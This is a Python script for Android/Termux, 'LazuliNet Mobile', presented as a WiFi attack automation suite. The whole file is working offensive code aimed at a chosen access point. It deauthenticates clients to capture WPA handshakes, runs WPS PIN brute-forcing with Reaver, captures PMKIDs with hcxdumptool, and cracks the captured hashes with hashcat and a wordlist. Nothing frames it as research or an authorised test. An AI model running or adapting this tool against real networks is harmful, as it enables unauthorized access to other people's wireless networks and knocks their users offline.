#!/data/data/com.termux/files/usr/bin/python3
"""
╔══════════════════════════════════════════╗
║        LAZULINET MOBILE v1.0             ║
║  WiFi Attack Automation Suite            ║
║  Android / Termux Edition                ║
║  "No void unfilled, no target unbroken"  ║
╚══════════════════════════════════════════╝
"""
import os, sys, time, subprocess, argparse, signal, json
from pathlib import Path
from datetime import datetime

INTERFACE = "wlan0"
MONITOR_IFACE = None
WORDLIST = "/sdcard/wordlists/rockyou.txt"
OUTPUT_DIR = Path("/sdcard/LazuliNet_Output")

def run_root(cmd, timeout=30):
    try:
        result = subprocess.run(f"tsu -c '{cmd}'", shell=True, capture_output=True, text=True, timeout=timeout)
        if result.returncode != 0 and "Permission denied" in result.stderr:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip(), result.stderr.strip()
    except: return "", ""

def check_root():
    out, _ = run_root("id")
    return "uid=0" in out

def detect_interface():
    out, _ = run_root("ip link show")
    for line in out.split('\n'):
        if "wl" in line and "state UP" in line:
            return line.split(": ")[1].split(":")[0]
    return "wlan0"

def enable_monitor_mode(iface):
    if not check_root(): return None
    run_root(f"ip link set {iface} down")
    run_root(f"iw dev {iface} set type monitor")
    run_root(f"ip link set {iface} up")
    out, _ = run_root(f"iw dev {iface} info")
    if "type monitor" in out: return iface
    run_root(f"airmon-ng start {iface}")
    out2, _ = run_root("iw dev")
    for line in out2.split('\n'):
        if "Interface" in line:
            mon = line.split()[-1]
            if "mon" in mon: return mon
    return None

def disable_monitor_mode(mon_iface):
    run_root(f"airmon-ng stop {mon_iface}")
    run_root(f"ip link set {mon_iface} down")
    run_root(f"iw dev {mon_iface} set type managed")
    run_root(f"ip link set {mon_iface} up")

def scan_networks(duration=30, target_channel=None):
    global MONITOR_IFACE
    if not MONITOR_IFACE: return []
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = OUTPUT_DIR / f"scan_{timestamp}"
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    cmd = f"airodump-ng {MONITOR_IFACE} -w {out_file} --output-format csv"
    if target_channel: cmd += f" -c {target_channel}"
    proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
    try: time.sleep(duration)
    except KeyboardInterrupt: pass
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    proc.wait()
    csv_file = f"{out_file}-01.csv"
    if not os.path.exists(csv_file): return []
    networks = []
    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f: lines = f.readlines()
    net_start = 0
    for i, line in enumerate(lines):
        if "BSSID" in line and "ESSID" in line: net_start = i+1; break
    for line in lines[net_start:]:
        if not line.strip() or "Station" in line: break
        parts = [p.strip() for p in line.split(',')]
        if len(parts) >= 14:
            net = {"bssid":parts[0],"channel":parts[3],"privacy":parts[5],"cipher":parts[6],"auth":parts[7],"power":parts[8],"essid":parts[13].strip('"') if len(parts)>13 else "<Hidden>"}
            if net["essid"]: networks.append(net)
    print("\n"+"="*80)
    print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<4} {'ENC':<8} {'PWR':<5}")
    print("="*80)
    for i, net in enumerate(networks): print(f"{i:<3} {net['essid']:<25} {net['bssid']:<18} {net['channel']:<4} {net['privacy']:<8} {net['power']:<5}")
    print("="*80)
    with open(OUTPUT_DIR / "networks.json", 'w') as jf: json.dump(networks, jf, indent=2)
    print(f"[+] Found {len(networks)} networks.")
    return networks

def deauth_capture(bssid, channel, client=None):
    global MONITOR_IFACE
    if not MONITOR_IFACE: return None
    run_root(f"iw dev {MONITOR_IFACE} set channel {channel}")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cap_file = OUTPUT_DIR / f"capture_{timestamp}"
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    airodump_cmd = f"airodump-ng {MONITOR_IFACE} -c {channel} --bssid {bssid} -w {cap_file}"
    airodump_proc = subprocess.Popen(airodump_cmd, shell=True, preexec_fn=os.setsid)
    time.sleep(3)
    deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {MONITOR_IFACE}"
    if client: deauth_cmd += f" -c {client}"
    run_root(deauth_cmd)
    time.sleep(30)
    os.killpg(os.getpgid(airodump_proc.pid), signal.SIGTERM)
    airodump_proc.wait()
    cap_path = f"{cap_file}-01.cap"
    if os.path.exists(cap_path):
        print(f"[+] Handshake captured: {cap_path}")
        return cap_path
    print("[!] No handshake found.")
    return None

def wps_attack(bssid, channel):
    global MONITOR_IFACE
    if not MONITOR_IFACE: return
    run_root(f"iw dev {MONITOR_IFACE} set channel {channel}")
    cmd = f"reaver -i {MONITOR_IFACE} -b {bssid} -c {channel} -vv -K 1"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    try:
        for line in proc.stdout:
            print(line, end="")
            if "WPA PSK:" in line: print(f"\n[!] KEY FOUND: {line.strip()}")
    except KeyboardInterrupt:
        proc.terminate()
        print("\n[*] Attack stopped.")

def pmkid_capture(bssid, channel):
    global MONITOR_IFACE
    if not MONITOR_IFACE: return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = OUTPUT_DIR / f"pmkid_{timestamp}"
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    filter_file = "/tmp/lazulinet_target.txt"
    with open(filter_file, 'w') as f: f.write(bssid.replace(":", ""))
    cmd = f"hcxdumptool -i {MONITOR_IFACE} -c {channel} --filterlist={filter_file} --filtermode=2 -o {out_file}.pcapng --enable_status=15"
    proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
    try: time.sleep(30)
    except KeyboardInterrupt: pass
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    proc.wait()
    if os.path.exists(f"{out_file}.pcapng"):
        print(f"[+] PMKID saved: {out_file}.pcapng")
        hc_file = f"{out_file}.22000"
        run_root(f"hcxpcapngtool -o {hc_file} {out_file}.pcapng")
        print(f"[+] Hash file: {hc_file}")
    else: print("[!] Capture failed.")

def crack_wpa(capture_file, mode=22000):
    if capture_file.endswith(".cap"):
        hc_file = capture_file.replace(".cap", ".22000")
        run_root(f"hcxpcapngtool -o {hc_file} {capture_file}")
        capture_file = hc_file
    if not os.path.exists(WORDLIST):
        print(f"[!] Wordlist not found at {WORDLIST}")
        return
    cmd = f"hashcat -m {mode} {capture_file} {WORDLIST} --force -O --status --status-timer=10"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    try:
        for line in proc.stdout:
            print(line, end="")
            if "Cracked" in line: print("\n[!] CRACKED!")
    except KeyboardInterrupt:
        proc.terminate()
        print("\n[*] Paused.")

def main():
    global INTERFACE, MONITOR_IFACE
    parser = argparse.ArgumentParser(description="LazuliNet Mobile")
    sub = parser.add_subparsers(dest="cmd")
    mon = sub.add_parser("monitor", help="Enable monitor mode")
    mon.add_argument("--interface")
    scan_p = sub.add_parser("scan", help="Scan networks")
    scan_p.add_argument("--time", type=int, default=30)
    scan_p.add_argument("--channel", type=int)
    deauth_p = sub.add_parser("deauth", help="Deauth & capture handshake")
    deauth_p.add_argument("--bssid", required=True)
    deauth_p.add_argument("--channel", type=int, required=True)
    deauth_p.add_argument("--client")
    wps_p = sub.add_parser("wps", help="WPS attack")
    wps_p.add_argument("--bssid", required=True)
    wps_p.add_argument("--channel", type=int, required=True)
    pmkid_p = sub.add_parser("pmkid", help="PMKID capture")
    pmkid_p.add_argument("--bssid", required=True)
    pmkid_p.add_argument("--channel", type=int, required=True)
    crack_p = sub.add_parser("crack", help="Crack handshake/PMKID")
    crack_p.add_argument("--file", required=True)
    crack_p.add_argument("--mode", type=int, default=22000)
    stop_p = sub.add_parser("stop", help="Restore managed mode")

    args = parser.parse_args()
    if not args.cmd: parser.print_help(); return

    INTERFACE = detect_interface() if not args.interface else args.interface

    if args.cmd == "monitor":
        MONITOR_IFACE = enable_monitor_mode(INTERFACE)
        print(f"[+] Monitor mode: {MONITOR_IFACE}" if MONITOR_IFACE else "[!] Failed.")
    elif args.cmd == "scan":
        if not MONITOR_IFACE: MONITOR_IFACE = enable_monitor_mode(INTERFACE)
        if MONITOR_IFACE: scan_networks(args.time, args.channel)
    elif args.cmd == "deauth":
        if not MONITOR_IFACE: MONITOR_IFACE = enable_monitor_mode(INTERFACE)
        if MONITOR_IFACE: deauth_capture(args.bssid, args.channel, args.client)
    elif args.cmd == "wps":
        if not MONITOR_IFACE: MONITOR_IFACE = enable_monitor_mode(INTERFACE)
        if MONITOR_IFACE: wps_attack(args.bssid, args.channel)
    elif args.cmd == "pmkid":
        if not MONITOR_IFACE: MONITOR_IFACE = enable_monitor_mode(INTERFACE)
        if MONITOR_IFACE: pmkid_capture(args.bssid, args.channel)
    elif args.cmd == "crack": crack_wpa(args.file, args.mode)
    elif args.cmd == "stop":
        if MONITOR_IFACE: disable_monitor_mode(MONITOR_IFACE); MONITOR_IFACE = None
        print("[+] Monitor mode disabled.")

if __name__ == "__main__":
    main()
